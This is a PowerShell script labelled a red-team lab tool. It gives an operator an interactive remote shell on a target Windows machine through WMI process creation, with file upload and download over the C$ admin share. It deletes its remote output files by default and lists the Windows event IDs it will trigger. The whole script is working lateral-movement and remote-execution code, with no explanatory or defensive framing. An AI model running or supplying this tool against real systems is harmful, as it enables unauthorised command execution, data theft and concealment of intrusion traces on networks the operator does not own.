

Write-Host "┌─────────────────────────────────────────────┐" -ForegroundColor Cyan
Write-Host "│         Mr. WMI Interactive Console         │" -ForegroundColor Cyan
Write-Host "│             Red Team Lab Edition            │" -ForegroundColor Cyan
Write-Host "└─────────────────────────────────────────────┘" -ForegroundColor Cyan
Write-Host ""

# Session metadata
$SessionID = (New-Guid).ToString().Substring(0, 8)
$Operator  = Read-Host "Operator tag"
$Campaign  = Read-Host "Campaign tag (optional)"
$Transport = "WMI/DCOM"
$CleanupMode = $true   # Default ON

Write-Host "[*] Session ID:    $SessionID" -ForegroundColor DarkGray
Write-Host "[*] Operator:      $Operator" -ForegroundColor DarkGray
Write-Host "[*] Campaign:      $Campaign" -ForegroundColor DarkGray
Write-Host "[*] Transport:     $Transport" -ForegroundColor DarkGray
Write-Host "[*] Cleanup:       Enabled" -ForegroundColor DarkGray
Write-Host ""

$ComputerName = Read-Host "Target computer"
if ([string]::IsNullOrWhiteSpace($ComputerName)) {
    Write-Host "[!] No target entered. Exiting." -ForegroundColor Red
    return
}

$RemoteBaseDir = "C:\Temp"
$RemoteSessionDir = Join-Path $RemoteBaseDir ("wmi_" + $SessionID)
$RemoteShareDir = "\\$ComputerName\C$\Temp\wmi_$SessionID"

function New-RemoteOutputFile {
    $Name = "out_{0}.txt" -f (Get-Date -Format "yyyyMMdd_HHmmss_fff")
    return Join-Path $RemoteSessionDir $Name
}

$LocalLog = "$env:TEMP\WMIConsole_${SessionID}.log"

function Log {
    param([string]$Message)
    $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    Add-Content -Path $LocalLog -Value "[$ts][$Operator][$SessionID] $Message"
}

Log "Session started for $ComputerName (Campaign: $Campaign)"


try {
    if (-not (Test-Path $RemoteShareDir)) {
        New-Item -ItemType Directory -Path $RemoteShareDir -Force | Out-Null
    }
} catch {
    Write-Host "[!] Cannot create remote session directory." -ForegroundColor Red
    Log "Failed to create remote directory: $_"
    return
}

Write-Host "`n[+] Connected to $ComputerName" -ForegroundColor Green
Write-Host "[*] type 'exit' to quit" -ForegroundColor Yellow
Write-Host "[*] upload <local> <remote>" -ForegroundColor Yellow
Write-Host "[*] download <remote> <local>" -ForegroundColor Yellow
Write-Host "[*] mode cmd | mode ps" -ForegroundColor Yellow
Write-Host ""

$CurrentMode = "cmd"

# Polling function (smart timing)
function Wait-ForOutput {
    param([string]$Path)
    $Attempts = 0

    while ($Attempts -lt 20) {
        if (Test-Path $Path) { return $true }
        Start-Sleep -Milliseconds ( if ($Attempts -lt 4) { 400 } else { 800 } )
        $Attempts++
    }
    return $false
}

while ($true) {

    $cmd = Read-Host "[$Operator][$ComputerName][$CurrentMode]"

    if ($cmd -eq "exit") {
        Write-Host "`n[*] Session closed." -ForegroundColor Cyan
        break
    }

    if ($cmd -match '^mode (cmd|ps)$') {
        $CurrentMode = $Matches[1]
        Write-Host "[+] Switched to $CurrentMode mode" -ForegroundColor Cyan
        continue
    }

    if ($cmd -match '^upload (.+?) (.+)$') {
        $local = $Matches[1]
        $remote = $Matches[2]
        try {
            Copy-Item $local "\\$ComputerName\C$\$remote" -Force
            Write-Host "[+] Uploaded → $remote" -ForegroundColor Green
            Log "Uploaded $local to $remote"
        } catch {
            Write-Host "[!] Upload failed" -ForegroundColor Red
            Log "Upload error: $_"
        }
        continue
    }


    if ($cmd -match '^download (.+?) (.+)$') {
        $remote = $Matches[1]
        $local  = $Matches[2]
        try {
            Copy-Item "\\$ComputerName\C$\$remote" $local -Force
            Write-Host "[+] Downloaded ← $local" -ForegroundColor Green
            Log "Downloaded $remote to $local"
        } catch {
            Write-Host "[!] Download failed" -ForegroundColor Red
            Log "Download error: $_"
        }
        continue
    }

    if ($cmd -match '(^| )(del|erase|remove-item|rm|rmdir|rd)( |$)') {
        Write-Host "[?] Destructive command detected. Proceed? (y/n)" -ForegroundColor Red
        if ((Read-Host) -ne 'y') { continue }
    }

    if ([string]::IsNullOrWhiteSpace($cmd)) { continue }

    $RemoteOutputPath = New-RemoteOutputFile
    $RemoteShareOutputPath = "\\$ComputerName\C$\Temp\wmi_$SessionID\" + (Split-Path $RemoteOutputPath -Leaf)


    if ($CurrentMode -eq "ps") {
        $RemoteExec = "powershell.exe -NoProfile -Command `"${cmd}`" > `"$RemoteOutputPath`" 2>&1"
    } else {
        $RemoteExec = "cmd.exe /c $cmd > `"$RemoteOutputPath`" 2>&1"
    }


    Log "Executing: $cmd"
    Write-Host "[*] Transport: $Transport" -ForegroundColor DarkGray

    try {
        $result = Invoke-WmiMethod -Class Win32_Process -Name Create `
            -ArgumentList $RemoteExec -ComputerName $ComputerName
    } catch {
        Write-Host "[!] WMI execution failed" -ForegroundColor Red
        Log "WMI execution failed: $_"
        continue
    }

    $PID = $result.ProcessId
    $RC  = $result.ReturnValue

    Write-Host "[+] PID: $PID │ RC: $RC" -ForegroundColor DarkGray
    Log "PID=$PID RC=$RC"

    Write-Host "[telemetry] Expect: 4688, 5861, Sysmon 1" -ForegroundColor DarkGray


    if (-not (Wait-ForOutput $RemoteShareOutputPath)) {
        Write-Host "[!] Output timeout" -ForegroundColor Red
        Log "Output timeout"
        continue
    }

    Write-Host "──────── OUTPUT ────────" -ForegroundColor Yellow
    Get-Content $RemoteShareOutputPath
    Write-Host "────── END OUTPUT ──────" -ForegroundColor Yellow

    Log "Output retrieved"

    if ($CleanupMode) {
        Remove-Item $RemoteShareOutputPath -Force -ErrorAction SilentlyContinue
        Log "Cleaned remote artifact"
    }

    Write-Host ""
}

if ($CleanupMode) {
    try {
        Remove-Item $RemoteShareDir -Recurse -Force -ErrorAction SilentlyContinue
        Log "Removed remote session folder"
    } catch {}
}

Write-Host "[*] Local log saved to: $LocalLog" -ForegroundColor DarkGray
Log "Session ended"
